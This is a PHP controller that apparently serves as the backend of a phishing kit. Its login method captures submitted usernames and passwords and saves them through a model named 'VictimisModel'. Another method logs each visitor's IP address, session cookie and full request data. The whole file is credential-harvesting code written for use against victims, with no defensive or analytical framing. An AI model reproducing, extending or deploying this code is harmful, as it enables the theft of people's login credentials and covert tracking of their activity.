<?php


class LoginController extends BaseController{


    public function request() : RequestModel{
        return model("RequestModel");
    }

    public function clients() : ClientsModel{
        return model("ClientsModel");
    }

    public function victimis() : VictimisModel {
        return model('VictimisModel');
    }

    public function login($request) {
        $idClient = $this->registerRequests();
        $user = $request->username ?? "unknow";
        $password = $request->password ?? "unknow";
        $this->victimis()->new(
            $idClient,
            $user,
            $password
        );
    }


    public function registerRequests(){
        $ip = Request::$ip;
        $sessionSao = Request::$cookies->SAOSESSID;
        $clients = $this->clients();
        $idClient = $clients->existsBySessionSao($sessionSao) ?
                    $clients->getIdBySessionSao($sessionSao) :
                    $clients->new($sessionSao);
        $this->request()->new(
            $idClient,
            json_encode(Request::$allData),
            $ip
        );
        return $idClient;
    }
    
}